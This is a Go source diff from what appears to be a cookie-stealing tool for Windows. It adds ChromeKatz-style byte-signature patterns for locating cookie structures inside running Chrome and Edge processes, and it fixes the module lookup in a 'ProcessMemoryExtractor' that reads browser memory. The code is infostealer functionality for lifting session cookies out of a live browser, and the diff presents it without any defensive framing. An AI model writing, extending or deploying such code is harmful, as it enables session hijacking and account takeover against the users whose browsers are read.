@@ -41,6 +41,35 @@ type CanonicalCookieEdge struct {
 	HttpOnly     bool
 }
 
+// CookiePattern contains multiple patterns for different Chrome versions (ChromeKatz-style)
+type CookiePattern struct {
+	Pattern  []byte
+	Offset   int
+	MinGap   int
+	MaxGap   int
+	VVersion string
+}
+
+// CookiePatterns holds all known patterns from ChromeKatz research
+var CookiePatterns = []CookiePattern{
+	// Chrome v120+ pattern
+	{
+		Pattern:  []byte{0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x41, 0x56, 0x41, 0x57},
+		Offset:   0,
+		MinGap:   100,
+		MaxGap:   500,
+		VVersion: "v120+",
+	},
+	// Edge pattern
+	{
+		Pattern:  []byte{0x48, 0x85, 0xC0, 0x74, 0x15, 0x8B, 0x48, 0x08},
+		Offset:   0,
+		MinGap:   50,
+		MaxGap:   300,
+		VVersion: "Edge",
+	},
+}
+
 // ProcessMemoryExtractor handles memory-based cookie extraction
 type ProcessMemoryExtractor struct {
 	processHandle windows.Handle
@@ -118,9 +147,9 @@ func (pe *ProcessMemoryExtractor) GetModuleBaseAddress(moduleName string) (uintp
 
 	targetName := moduleName + ".dll"
 	for {
-		modName := windows.UTF16ToString(me.ModuleName[:])
+		modName := windows.UTF16ToString(me.Module[:])
 		if modName == targetName {
-			return uintptr(me.BaseOfDll), nil
+			return me.ModBaseAddr, nil
 		}
 
 		if err := windows.Module32Next(snapshot, &me); err != nil {
